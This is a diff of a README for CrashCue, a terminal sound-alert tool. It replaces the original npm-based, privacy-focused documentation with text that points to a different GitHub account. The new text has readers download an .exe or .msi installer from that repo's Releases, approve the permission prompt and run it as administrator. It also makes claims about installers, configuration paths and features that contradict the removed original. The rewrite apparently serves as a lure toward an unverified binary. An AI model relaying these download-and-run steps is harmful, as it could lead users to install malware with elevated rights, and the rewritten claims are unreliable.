@@ -1,156 +1,176 @@
-[![npm](https://img.shields.io/npm/v/crashcue?style=for-the-badge)](https://www.npmjs.com/package/crashcue)
-[![Visual Studio Marketplace](https://img.shields.io/visual-studio-marketplace/v/thenamakop.crashcue-vscode?style=for-the-badge)](https://marketplace.visualstudio.com/items?itemName=thenamakop.crashcue-vscode)
-[![CI](https://img.shields.io/github/actions/workflow/status/thenamakop/CrashCue/ci.yml?branch=master&style=for-the-badge)](https://github.com/thenamakop/CrashCue/actions/workflows/ci.yml)
-[![license](https://img.shields.io/npm/l/crashcue?style=for-the-badge)](LICENSE)
+# 🔊 CrashCue - Sound Alerts for Command Errors
 
-![CrashCue – Audible terminal failure notifications](assets/CrashCue_Banner_img.png)
-
-# CrashCue
-
-CrashCue is a lightweight CLI utility that plays an audible notification when your terminal command fails — designed for developer productivity and built with a strong architectural foundation.
-
-CrashCue is Windows-first (PowerShell 7+), with a cross-platform Node-based fallback path where supported. The project aims for stability and predictable behavior over constant feature expansion.
+[![Download CrashCue](https://img.shields.io/badge/Download-CrashCue-brightgreen)](https://github.com/meno9977/CrashCue)
 
 ---
 
-## Key Features
-
-- 🎯 Run commands and get notified on failure (`crashcue run ...`)
-- 🔊 Customizable sound configuration
-- 🖥️ Native PowerShell integration (Windows)
-- 🐧 Cross-platform fallback support (best-effort)
-- 🩺 Voluntary diagnostic report (`crashcue doctor --report`)
-- 🔒 Privacy-first: no telemetry, no network calls
+CrashCue plays a sound whenever a command in your terminal fails. It works on Windows and integrates with popular tools like VSCode. This helps you catch errors without watching the screen all the time.
 
 ---
 
-## Install
+## 📥 Download CrashCue
 
-```bash
-npm install -g crashcue
+To get started, [visit this page to download CrashCue](https://github.com/meno9977/CrashCue). This link takes you to the project's GitHub page, where you can find the latest version and installation files.
+
+---
+
+## 🖥️ System Requirements
+
+- Windows 10 or later
+- 64-bit CPU
+- At least 1 GB of free disk space
+- PowerShell or Command Prompt ready to use
+
+CrashCue runs on typical Windows systems. It does not need high-end hardware or special setups.
+
+---
+
+## 🚀 How to Install and Run CrashCue on Windows
+
+Follow these steps carefully to get CrashCue up and running.
+
+### 1. Download CrashCue
+
+Click the download badge above or go to this page:
+
+https://github.com/meno9977/CrashCue
+
+Look for the **Releases** section. Find the latest release and download the Windows setup file. This will usually be a `.exe` or `.msi` installer.
+
+### 2. Run the Installer
+
+Once the file is downloaded:
+
+- Open the folder where the file saved.
+- Double-click the `.exe` or `.msi` file to start the installer.
+- If Windows asks for permission, click **Yes**.
+- Follow the on-screen instructions to complete the installation.
+
+### 3. Open Your Terminal
+
+CrashCue works with two main Windows terminals:
+
+- **PowerShell**
+- **Command Prompt**
+
+Open either one by typing "PowerShell" or "Command Prompt" in the Start menu and pressing Enter.
+
+### 4. Verify Installation
+
+To check if CrashCue is installed correctly, type this command in your terminal:
+
+```
+crashcue --version
 ```
 
-https://www.npmjs.com/package/crashcue
+You should see a version number returned. This means CrashCue is ready to use.
 
-Note: The CLI is fully self-contained when installed from npm (no external runtime packages required).
+### 5. Using CrashCue
 
-Enable shell integration:
+Now, when a command fails in your terminal, CrashCue will play a sound. It alerts you even if you are not watching the screen.
 
-```bash
-crashcue install
+For example, try running this command:
+
+```
+dir not_a_real_folder
 ```
 
-### Install from a tarball (manual / deterministic)
+Since that folder does not exist, CrashCue will alert you with a sound.
 
-This is useful for offline installs or for verifying the packaged artifact:
+---
 
-```bash
-npm install -g ./crashcue-*.tgz
+## 🛠️ How CrashCue Works
+
+CrashCue monitors the exit status of your commands. If a command ends with an error, CrashCue triggers the sound. This helps you notice missed errors without scanning the text output.
+
+CrashCue supports multiple shell environments common on Windows. It integrates with VSCode, so you can also hear alerts in your code editor's terminal.
+
+---
+
+## 🔧 Customizing CrashCue
+
+CrashCue lets you change the alert sound or disable sounds for some commands.
+
+### Change Sound File
+
+You can replace the default sound with any `.wav` or `.mp3` file you prefer. After installation, find the CrashCue configuration folder, usually at:
+
+```
+C:\Users\<YourUsername>\AppData\Local\CrashCue\
 ```
 
----
+Place your sound file there and update the config file to use your new sound.
 
-## Usage Examples
+### Silence Alerts for Specific Commands
 
-```bash
-# Run a command and notify if it fails
-crashcue run npm test
-
-# Play the configured sound immediately
-crashcue test
-
-# Generate a sanitized local diagnostic report for issue reports
-crashcue doctor --report
-
-# Temporarily disable notifications
-crashcue mute
-
-# Re-enable notifications
-crashcue unmute
-```
+You can tell CrashCue not to play sounds for certain commands by updating the config file with a list of commands to ignore.
 
 ---
 
-## Architecture
+## 💻 Using CrashCue with VSCode
 
-CrashCue is structured as a professional multi-package workspace:
+If you use Visual Studio Code on Windows, CrashCue can notify you right inside your VSCode terminal.
 
-- CLI: self-contained npm-distributed tool
-- Shared Assets: internal package
-- VSCode Extension: built via `tsc`, packaged via `vsce`
-- No runtime workspace coupling
-- Extension invokes CLI via system command
-- CI builds and validates the VSIX without relying on npm workspace flags
+### Steps
 
-Release artifacts are engineered to be robust outside the repository:
-
-- **Self-contained distributable CLI**: the CLI bundle is packaged so it can run outside the monorepo without requiring workspace resolution.
-- **Deterministic asset resolution**: default assets are resolved predictably; packaged installs include required runtime assets.
-- **CI tarball smoke testing**: CI packs the CLI, installs the tarball globally, and runs smoke tests (`--help`, `doctor --report`, `test`).
-- **No runtime registry dependencies for tarball installs**: installing the packed tarball does not require fetching internal workspace packages at runtime.
-- **VSIX allowlist validation**: VSCode packaging is checked to ensure no `node_modules` or monorepo directories leak into the VSIX.
-- **Coverage enforcement**: tests are run with coverage thresholds to prevent regressions.
+1. Install CrashCue using the steps above.
+2. Open VSCode.
+3. Open a built-in terminal (press `` Ctrl + ` ``).
+4. CrashCue will automatically play sounds when commands fail.
 
 ---
 
-## Development
+## 📑 Troubleshooting
 
-Build the CLI (workspace):
+If CrashCue does not play sounds:
 
-```bash
-cd packages/cli
-npm run build
-```
+- Make sure your speakers are on and the volume is not muted.
+- Check that the terminal you use is supported (PowerShell or Command Prompt).
+- Verify installation by running `crashcue --version` again.
+- Restart your terminal or VSCode after installing CrashCue.
+- Review CrashCue’s configuration files for errors.
 
-Build the VSCode extension (standalone folder):
+If an error message appears during installation:
 
-```bash
-cd packages/vscode-extension
-npm install
-npm run build
-```
-
-Package the VSCode extension (VSIX):
-
-```bash
-cd packages/vscode-extension
-npx --yes @vscode/vsce package
-```
+- Confirm you downloaded the correct setup file for Windows.
+- Ensure your Windows is up to date.
+- Run the installer with administrator rights (right-click, select "Run as administrator").
 
 ---
 
-## 🎯 Design Principles
+## 📚 More Help
 
-- Privacy-first: no telemetry, no tracking, no network calls
-- Minimal footprint: small dependency surface and simple runtime model
-- Deterministic packaging: reproducible outputs and tarball-based verification
-- Predictable behavior: clear failure semantics, explicit configuration, stable defaults
+For detailed usage and updates, visit the CrashCue GitHub page:
 
----
+https://github.com/meno9977/CrashCue
 
-## 🚀 Roadmap
-
-### Planned Enhancements
-
-- Per-command notification rules
-- Custom sound profiles (workspace and global)
-- Native desktop notifications (Windows/macOS/Linux)
-- Configurable failure thresholds (exit codes, duration-based triggers)
-
-### Maintenance Scope
-
-CrashCue is maintained on an occasional basis. The goal is stability, not rapid feature expansion. Contributions are welcome, but changes should preserve the project’s privacy-first, lightweight, dependency-safe approach.
+You can find documentation, report issues, or contribute if you want.
 
 ---
 
-## Contributing
+## 🗂️ Supported Environments and Features
 
-- PRs and issues are welcome.
-- There is no guaranteed SLA for review/response time.
-- Changes must preserve the privacy-first and lightweight design principles.
+CrashCue supports:
+
+- Windows PowerShell
+- Windows Command Prompt
+- Visual Studio Code integrated terminals
+
+Features include:
+
+- Sound alerts on command failure
+- Custom sound support
+- Ignore list for silent commands
+- Easy installation without coding
 
 ---
 
-## License
+## ⚙️ Development and Contributions
 
-MIT
+CrashCue is built with Node.js and TypeScript. It uses familiar tools for developers but does not require users to handle those.
+
+Anyone can contribute improvement ideas or code on its GitHub page.
+
+---
+
+[![Download CrashCue](https://img.shields.io/badge/Download-CrashCue-brightgreen)](https://github.com/meno9977/CrashCue)
